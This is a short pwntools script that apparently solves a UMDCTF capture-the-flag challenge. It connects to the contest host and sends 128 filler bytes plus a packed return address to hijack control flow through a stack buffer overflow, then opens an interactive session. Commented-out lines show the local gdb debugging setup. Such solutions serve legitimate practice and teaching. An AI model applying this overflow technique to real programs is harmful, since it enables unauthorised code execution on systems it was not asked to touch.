from pwn import *
context.terminal = ['tmux','splitw' ,'-h']
#context.binary = "./space"
#elf = ELF("./finished")
#libc = ELF("libc.so.6")

#sig = elf.symbols["sigma_mode()"]

#log.info(f"Address of sigma_mode: {hex(sig)}")

#p = process("./finished")
p = remote('challs.umdctf.io', 31099)
#p = gdb.debug("./finished", '''
#break *main
#break *main+108
#break *0x401a8c
#''')

# What size allocation?
print(p.recvline())

exploit = b""
exploit += b"A" * 128
#exploit += b"B" * 8
exploit += p64(0x401b16)
#exploit += b"C" * (500 - 128 - 16)

p.sendline(exploit)
p.interactive()
